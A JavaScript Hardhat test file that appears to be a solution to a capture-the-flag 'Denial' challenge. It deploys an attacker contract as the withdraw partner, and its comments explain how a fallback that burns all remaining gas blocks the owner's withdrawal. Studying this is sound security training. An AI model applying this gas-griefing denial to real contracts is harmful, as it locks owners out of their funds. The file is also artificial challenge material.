const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

*/

describe("[Challenge] Denial", function () {
  let deployer, attacker;
  const INITIAL_DEPOSIT = ethers.utils.parseEther("0.001");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.denial = await (
      await ethers.getContractFactory("Denial", deployer)
    ).deploy();

    // send initial deposit
    await deployer.sendTransaction({
      value: INITIAL_DEPOSIT,
      to: this.denial.address,
    });
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    this.denialAttack = await (
      await ethers.getContractFactory("DenialAttack", attacker)
    ).deploy();

    await this.denial.setWithdrawPartner(this.denialAttack.address);

    // in withdraw() => partner.call{value:amountToSend}("");
    // call will take all remaining gas

    // assert(false) is a possible answer before solidity 0.8

    // revert - revert all changes and refunds remaining gas
    // assert - revert all changes and consume all gas (before 0.8)
    // assert - revert all changes and refunds remaining gas (after 0.8)
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    this.denialFactory = await (
      await ethers.getContractFactory("DenialFactory", deployer)
    ).deploy();

    await this.denialFactory.validateInstance(this.denial.address);

    const validate = await this.denialFactory.validate();
    expect(validate).to.eq(true);
  });
});
